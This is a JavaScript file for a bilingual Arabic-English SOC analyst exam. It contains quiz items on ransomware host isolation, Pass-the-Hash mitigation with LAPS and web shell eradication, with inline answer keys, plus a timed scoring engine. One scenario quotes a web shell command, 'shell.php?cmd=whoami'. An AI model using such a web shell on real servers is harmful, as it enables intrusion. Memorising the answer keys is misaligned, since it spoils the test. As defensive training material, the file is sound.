      "إعادة تشغيل خادم النسخ الاحتياطي 5 مرات متتالية.",
      "دفع الفدية فوراً بالعملات الرقمية دون مراجعة الإدارة."
    ],
    optionsEn: [
      "Execute immediate Host Isolation via EDR on the patient-zero machine, alongside temporary containment blocks on TCP port 445/139 to halt lateral movement.",
      "Schedule a standard weekly full antivirus scan for the following weekend.",
      "Reboot the backup storage appliance 5 times.",
      "Transfer cryptocurrency ransom immediately without consulting incident commanders."
    ],
    correct: 0,
    explanation: "العزل الشبكي الفوري (Host Isolation) يمنع فيروس الفدية من إكمال مسيرته وتشفير خوادم النسخ الاحتياطي والملفات المشتركة؛ وهو خط الدفاع الأول في الاحتواء.",
    explanationEn: "Network host isolation severs active SMB lateral infection chains, shielding core database servers and backup repositories from catastrophic encryption."
  },
  {
    id: 34,
    domain: "فرز التنبيهات والاستجابة للحوادث",
    domainEn: "Alert Triage & Incident Playbooks",
    topic: "Lateral Movement & Pass-the-Hash Remediation",
    scenario: "كشف التحقيق أن مهاجماً استخرج هاش NTLM لحساب مدير محلي (Local Administrator) من جهاز مستخدم، ثم استخدم أداة مثل PsExec لتسجيل الدخول به على 20 جهازاً آخر في الشبكة.",
    scenarioEn: "Forensics establishes an attacker dumped the local Administrator NTLM hash on a workstation, using PsExec to perform Pass-the-Hash against 20 other hosts on the subnet sharing identical passwords.",
    question: "ما هي التقنية الأمنية المجانية من مايكروسوفت التي تمنع نجاح هذا الهجوم تماماً بتخصيص كلمة سر عشوائية فريدة لكل جهاز محلي؟",
    questionEn: "What Microsoft solution prevents this lateral movement by enforcing unique, random local Administrator passwords per machine?",
    options: [
      "نظام إدارة كلمات المرور المحلية (Microsoft LAPS - Local Administrator Password Solution).",
      "برنامج الرسام في ويندوز.",
      "أداة تشخيص الذاكرة في ويندوز.",
      "برنامج مشغل الموسيقى Windows Media Player."
    ],
    optionsEn: [
      "Microsoft LAPS (Local Administrator Password Solution / Windows LAPS).",
      "Windows Paint utility.",
      "Windows Memory Diagnostic tool.",
      "Windows Media Player service."
    ],
    correct: 0,
    explanation: "أداة LAPS تجعل كلمة سر المدير المحلي فريدة وعشوائية لكل حاسوب على حدة وتتغير دورياً في الدليل النشط؛ مما يجعل هاش NTLM المسروق من جهاز عديم الفائدة على الأجهزة الأخرى.",
    explanationEn: "Microsoft LAPS automatically generates unique, complex, randomized local Administrator passwords rotated on every endpoint, effectively killing Pass-the-Hash lateral movement."
  },
  {
    id: 35,
    domain: "فرز التنبيهات والاستجابة للحوادث",
    domainEn: "Alert Triage & Incident Playbooks",
    topic: "Web Shell Eradication & Post-Incident Playbook",
    scenario: "عثر المحلل في خادم ويب خارجي للشركة على ملف مشبوه باسم `shell.php` داخل مجلد رفع الصور `/uploads/images/`، ويتيح للمهاجم إرسال أوامر عبر المتغير `cmd` مثل: `shell.php?cmd=whoami`.",
    scenarioEn: "On an internet-facing web server, an analyst locates shell.php inside the public /uploads/images/ folder, executing commands passed via parameter: shell.php?cmd=whoami.",
    question: "ما هي خطوات الاستئصال والتحصين (Eradication & Hardening) الصحيحة للتعامل مع هذا الحادث؟",
    questionEn: "What are the correct Eradication & Hardening actions to resolve this incident permanently?",
    options: [
      "1. أخذ نسخة جنائية من الملف ثم حذفه فوراً من السيرفر؛ 2. مراجعة سجلات الـ Web Access Logs لمعرفة الـ IP الذي رفعه والبحث عن ثغرة رفع الملفات لمعالجتها برمجياً؛ 3. تعديل إعدادات خادم الويب (مثل Nginx أو Apache) لمنع تنفيذ أي سكربتات برمجية (مثل PHP) داخل مجلد الـ uploads كلياً.",
      "1. تغيير اسم الملف إلى صورة jpg وتركه في مكانه؛ 2. إيقاف الجدار الناري.",
      "1. مسح جميع سجلات السيرفر لإخفاء الحادث عن الإدارة.",
      "1. تشغيل أمر shell.php للتأكد من سرعته."
    ],
    optionsEn: [
      "1. Acquire forensic evidence then isolate/quarantine shell.php; 2. Inspect Web Access logs to trace the uploading IP and patch the file-upload vulnerability; 3. Reconfigure web server (Nginx/Apache) to disable script execution within the /uploads/ directory.",
      "1. Rename file to .jpg and leave it active; 2. Disable web application firewall.",
      "1. Purge all access logs to conceal incident from leadership.",
      "1. Execute shell commands to benchmark server processing speed."
    ],
    correct: 0,
    explanation: "عزل وحذف شل الويب، ثم مراجعة السجلات لتحديد ثغرة الرفع وسدها، ثم منع صلاحية التنفيذ (Execution) في مجلدات التحميل هو الإجراء الميداني النموذجي للقضاء على الـ Web Shell.",
    explanationEn: "Preserving the artifact for reverse engineering, patching the unrestricted file upload bug, and configuring web server directives to block script execution in uploads permanently resolves web shells."
  }
];

// SOC Final Exam Engine Class with 45-Minute Timer & Instant Scoring
class SOCFinalExamEngine {
  constructor() {
    this.questions = finalExamQuestions;
    this.userAnswers = {};
    this.currentQuestionIdx = 0;
    this.timeRemainingSeconds = 45 * 60; // 45 minutes
    this.timerInterval = null;
    this.isSubmitted = false;
  }

  reset() {
    this.userAnswers = {};
    this.currentQuestionIdx = 0;
    this.timeRemainingSeconds = 45 * 60;
    if (this.timerInterval) clearInterval(this.timerInterval);
    this.timerInterval = null;
    this.isSubmitted = false;
  }

  startTimer(onTick, onExpired) {
    if (this.timerInterval) clearInterval(this.timerInterval);
    this.timerInterval = setInterval(() => {
      this.timeRemainingSeconds--;
      if (typeof onTick === 'function') onTick(this.formatTime());
      if (this.timeRemainingSeconds <= 0) {
        clearInterval(this.timerInterval);
        if (typeof onExpired === 'function') onExpired();
      }
    }, 1000);
  }

  stopTimer() {
    if (this.timerInterval) {
      clearInterval(this.timerInterval);
      this.timerInterval = null;
    }
  }

  formatTime() {
    const mins = Math.floor(this.timeRemainingSeconds / 60);
    const secs = this.timeRemainingSeconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  }

  recordAnswer(questionId, optionIndex) {
    this.userAnswers[questionId] = optionIndex;
  }

  calculateResult() {
    let correctCount = 0;
    const details = [];

    this.questions.forEach((q) => {
      const userChoice = this.userAnswers[q.id];
      const isCorrect = userChoice === q.correct;
      if (isCorrect) correctCount++;

      details.push({
        id: q.id,
        domain: q.domain,
        domainEn: q.domainEn || q.domain,
        topic: q.topic,
        question: q.question,
        questionEn: q.questionEn || q.question,
        userChoice: userChoice !== undefined ? userChoice : -1,
        correctChoice: q.correct,
        isCorrect: isCorrect,
        explanation: q.explanation,
        explanationEn: q.explanationEn || q.explanation
      });
    });

    const total = this.questions.length;
    const percentage = Math.round((correctCount / total) * 100);
    const passed = percentage >= 70; // 70% passing threshold

    return {
      total,
      correctCount,
      percentage,
      passed,
      details
    };
  }
}

// Global Exam Engine Instance
const finalExamEngine = new SOCFinalExamEngine();